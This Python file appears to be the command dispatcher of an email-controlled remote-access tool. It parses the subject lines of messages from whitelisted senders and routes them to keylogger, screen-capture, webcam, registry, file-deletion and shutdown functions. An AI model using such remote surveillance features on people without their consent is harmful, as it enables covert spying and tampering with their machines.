import shlex
import constants
import utils

from services import app, help, keylogger, mac, pc, process, registry, screen, webcam, explorer
from GlobalVariables import white_list

request_tree = {
    'basic_command' : {
        'mac' : {
            'get': [0, mac.get_mac]
        },
        'app' : {
            'get': [0, app.get_apps], 
            'close': [1, None]
        },
        'process': {
            'get': [0, process.get_processes],
            'close': [1, None]
        }, 
        'keylogger': {
            'get': [1, keylogger.get_key_log]
        },
        'screen': {
            'get' : {
                'image': [0, screen.screen_shot],
                'video': [1, screen.screen_record]
            },
        }, 
        'webcam': {
            'get' : {
                'image': [0, webcam.webcam_shot],
                'video': [1, webcam.webcam_record]
            }
        },
        'help': [0, help.show_helps]
    },
    'advance_command' : {
        'pc' : {
            'shutdown': [0, pc.shutdown],
            'restart': [0, pc.restart]
        },
        'registry': {
            'get': [1, registry.get],
            'add': [3, registry.new_key],
            'modify': [3, registry.modify_key],
            'remove': [1, registry.drop_key],
        },
        'explorer': {
            'tree': [1, explorer.show_tree],
            'copy': [2, explorer.copy],
            'cut': [2, explorer.cut],
            'delete': [1, explorer.delete]
        }
    }
}

def parse_request(mail_content):
    sender, header = mail_content['sender'], mail_content['subject'] 
    tokens = shlex.split(header)
    
    if sender not in white_list['basic'] and sender not in white_list['advanced']:
        return {
            'msg': 'Permission denied'
        }
    
    if (tokens[0] != constants.APP_REQ):
        return {
            'msg': 'Wrong request format'
        }
    
    tokens = tokens[1: ]
    
    if len(tokens) == 0:
        return {
            'msg': 'Command not found'
        }
    
    tree = None
    
    if tokens[0].lower() in request_tree['basic_command']:
        tree = request_tree['basic_command']
    elif tokens[0].lower() in request_tree['advance_command']:
        if sender not in white_list['advance_user']:
            return {
                'msg': 'Permision denied'
            }
        tree = request_tree['advance_command']

    if not tree:
        return {
            'msg': 'Command not found'
        }
    
    tokens = tokens[1 : ]
    
    len_expected = 0
    func, param = None, None
    
    for iter, node in enumerate(tokens, 0):
        if not type(tree) == dict:
            if iter + tree[0] >= len(tokens):
                return {
                    'msg': f'{" ".join(tokens[ : iter])} take at least {tree[0]} parameter(s). Found {len(tokens) - 1 - iter}'
                }
            
            func = tree[1]
            
            if tree[0] != 0:
                param = tokens[iter: iter + tree[0]]
            
            break
        
        if node.lower() in tree:
            len_expected += 1
            tree = tree[node.lower()]
        else:
            return {
                'msg' : f'Command not found {" ".join(tokens[ : iter])}'
            }
        
    return {
        'function': func,
        'params': param,
        'msg': 'Parse request successfully'
    }

mail = {
    'sender': 'dotrann.1412'
}